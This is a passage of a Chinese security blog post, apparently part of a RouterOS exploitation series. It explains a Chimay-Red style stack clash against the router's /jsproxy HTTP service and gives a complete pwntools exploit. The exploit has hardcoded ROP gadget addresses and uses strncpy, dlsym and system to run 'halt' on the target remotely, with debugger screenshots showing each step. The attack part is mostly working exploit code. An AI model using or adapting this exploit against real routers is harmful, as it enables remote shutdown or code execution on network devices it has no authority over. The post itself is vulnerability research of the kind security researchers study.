+<p>现在的思路就很简单了，我们去修改 线程2 中的某个返回地址， 然后进行 <code>rop</code>.为了精确控制返回地址。先使用 <code>cyclic</code> 来确定返回地址的偏移.因为该程序线程栈的大小为 <code>0x20000</code> 所以用一个大一点的值试几次就能试出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s2 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line"></div><div class="line"></div><div class="line">s1.send(makeHeader(0x20900))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.send(makeHeader(0x100))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line">s1.send(cyclic(0x2000))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line">s2.close()  # tigger </div><div class="line">pause()</div></pre></td></tr></table></figure></p>
+<p>崩溃后的位置<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203525302ht7bhy5u.png?imageslim" alt="paste image"></p>
+<p>然后用 <code>eip</code> 的值去计算下偏移</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203624359611r5xlg.png?imageslim" alt="paste image"></p>
+<p>然后调整 <code>poc</code> 测试一下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203798622buq6fgpb.png?imageslim" alt="paste image"></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203815266tllctxmq.png?imageslim" alt="paste image"></p>
+<p>ok, 接下来就是 <code>rop</code> 了。</p>
+<p><strong>rop</strong></p>
+<p>程序中没有 <code>system</code>, 所以我们需要先拿到 <code>system</code> 函数的地址，然后调用 <code>system</code> 执行命令即可。</p>
+<p>这里采取的 <code>rop</code> 方案如下。</p>
+<ul>
+<li>首先 通过 <code>rop</code> 调用 <code>strncpy</code> 设置我们需要的字符串（我们只有一次输入机会）</li>
+<li>然后调用 <code>dlsym</code> , 获取 <code>system</code> 的函数</li>
+<li>调用 <code>system</code> 执行命令</li>
+</ul>
+<p>使用 <code>strncpy</code> 设置我们需要的字符串的思路非常有趣。 因为我们只有一次的输入机会，而<code>dlsym</code> 和 <code>system</code> 需要的参数都是 字符串指针， 所以我们必须在 调用它们之前把 需要的字符串事先布置到已知的地址，使用 <code>strncpy</code> 我们可以使用 程序文件中自带的一些字符来拼接字符串。</p>
+<p>下面看看具体的 <code>exp</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515204586149s7886t42.png?imageslim" alt="paste image"></p>
+<p>首先这里使用 了 <code>ret 0x1bb</code> 用来把栈往下移动了一下，因为程序运行时会修改其中的一些值，导致 <code>rop</code> 链被破坏，把栈给移下去就可以绕过了。（这个自己调 <code>rop</code> 的时候注意看就知道了。）</p>
+<p>首先我们得设置 <code>system</code> 字符串 和 要执行的命令 这里为 <code>halt</code>(关机命令)。 以 <code>system</code> 字符串 的构造为例。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515204942477uir3mq2s.png?imageslim" alt="paste image"><br>分3次构造了 <code>system</code> 字符串，首先设置 <code>sys</code> , 然后 <code>te</code> , 最后 <code>m</code>.</p>
+<p>同样的原理设置好 <code>halt</code> , 然后调用 <code>dlsym</code> 获取  <code>system</code> 的地址。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15152051616411xqvk27b.png?imageslim" alt="paste image"><br>执行 <code>dlsym(0, &quot;system&quot;)</code> 即可获得 <code>system</code> 地址， 函数返回时保存在 <code>eax</code>, 所以接下来 在栈上设置好参数（<code>halt</code> 字符串的地址） 然后 <code>jmp eax</code> 即可。</p>
+<p>下面调试看看<br>首先 <code>ret 0x1bb</code>, 移栈<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205323369xyzljof1.png?imageslim" alt="paste image"></p>
+<p>然后是执行 <code>strncpy</code> 设置 <code>system</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205402433o5soeoxp.png?imageslim" alt="paste image"></p>
+<p>设置完后，我们就有了 <code>system</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205476774vuyjgswn.png?imageslim" alt="paste image"></p>
+<p>然后执行 <code>dlsym(0, &quot;system&quot;)</code> </p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205601990727005zg.png?imageslim" alt="paste image"></p>
+<p>执行完后， <code>eax</code> 保存着 <code>system</code> 函数的地址</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205780535xi426xmw.png?imageslim" alt="paste image"></p>
+<p>然后利用 <code>jmp eax</code> 调用 <code>system(&quot;halt&quot;)</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205845365jiu6x47t.png?imageslim" alt="paste image"></p>
+<p>运行完后，系统就关机了。</p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>理解了多线程的机制。 对于不太好计算的，可以猜个粗略的值，然后使用 <code>cyclic</code> 来确定之。 <code>strncpy</code> 设置字符串的技巧不错。 <code>dlsym(0, &quot;system&quot;)</code> 可以用来获取函数地址。调试 <code>rop</code> 时要细心，<code>rop</code> 链被损坏使用 <code>ret *</code> 之类的操作绕过之。一些不太懂的东西，写个小的程序测试一下。</p>
+<p><strong>exp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s2 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line"></div><div class="line"></div><div class="line">s1.send(makeHeader(0x20900))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.send(makeHeader(0x100))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">strncpy_plt = 0x08050D00</div><div class="line">dlsym_plt = 0x08050C10</div><div class="line"></div><div class="line">system_addr = 0x0805C000 + 2</div><div class="line">halt_addr = 0x805c6e0</div><div class="line"></div><div class="line">#pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</div><div class="line"># .text:08059C03                 pop     ebx</div><div class="line"># .text:08059C04                 pop     esi</div><div class="line"># .text:08059C05                 pop     ebp</div><div class="line"># .text:08059C06                 retn</div><div class="line">ppp_addr = 0x08059C03</div><div class="line">pp_addr = 0x08059C04</div><div class="line">pppppr_addr = 0x080540b4</div><div class="line"># 0x0805851f : ret 0x1bb</div><div class="line">ret_38 = 0x0804ae8c</div><div class="line">ret_1bb = 0x0805851f</div><div class="line">ret = 0x0804818c</div><div class="line"># make system str</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p32(ret_1bb)   # for bad string</div><div class="line">payload += p32(ret)</div><div class="line">payload += &quot;A&quot; * 0x1bb</div><div class="line">payload += p32(ret) # ret</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(0x0805ab58)  # str syscall</div><div class="line">payload += p32(3)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr + 3)</div><div class="line">payload += p32(0x0805b38d)  # str tent</div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr + 5)</div><div class="line">payload += p32(0x0805b0ec)  # str mage/jpeg</div><div class="line">payload += p32(1)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(halt_addr)</div><div class="line">payload += p32(0x0805670f)  </div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(halt_addr + 2)</div><div class="line">payload += p32(0x0804bca1)  </div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line"># call dlsym(0, &quot;system&quot;) get system addr</div><div class="line">payload += p32(dlsym_plt)</div><div class="line">payload += p32(pp_addr)</div><div class="line">payload += p32(0)</div><div class="line">payload += p32(system_addr)</div><div class="line"></div><div class="line">payload += p32(0x0804ab5b)</div><div class="line">payload += &quot;BBBB&quot;  # padding ret</div><div class="line">payload += p32(halt_addr)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s1.send(cyclic(1612) + payload + &quot;B&quot; * 0x100)</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.close()</div><div class="line"></div><div class="line">pause()</div></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<p><a href="https://github.com/BigNerd95/Chimay-Red" target="_blank" rel="external">https://github.com/BigNerd95/Chimay-Red</a></p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html">http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/01/05/pwn_routeros_step_2_poc.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/girl.png" alt="hac425's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        327164983@qq.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">13</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">1</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Vulnerability-analysis/">Vulnerability analysis<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/chrome/">chrome<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/ctf/">ctf<span class="sidebar_archives-count">10</span></a></li><li><a class="sidebar_archives-link" href="/categories/java应用破解思路/">java应用破解思路<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/jeb破解/">jeb破解<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/kernel/">kernel<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/pwn-router-os/">pwn_router_os<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/安卓安全/">安卓安全<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/categories/文件patch/">文件patch<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透测试/">渗透测试<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/路由器安全/">路由器安全<span class="sidebar_archives-count">10</span></a>
+            </ul>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/links" title="友情链接">
+                
+                    <i class="material-icons sidebar-material-icons">people</i>
+                
+                友情链接
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/tags" title="标签云">
+                
+                    <i class="material-icons sidebar-material-icons">invert_colors</i>
+                
+                标签云
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">36</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+        <a href="http://weibo.com/u/5691483590" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/jinyu00" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>穷则变，变则通，通则久
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?wgjW/HuQG9JDgvPDPoRAng==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
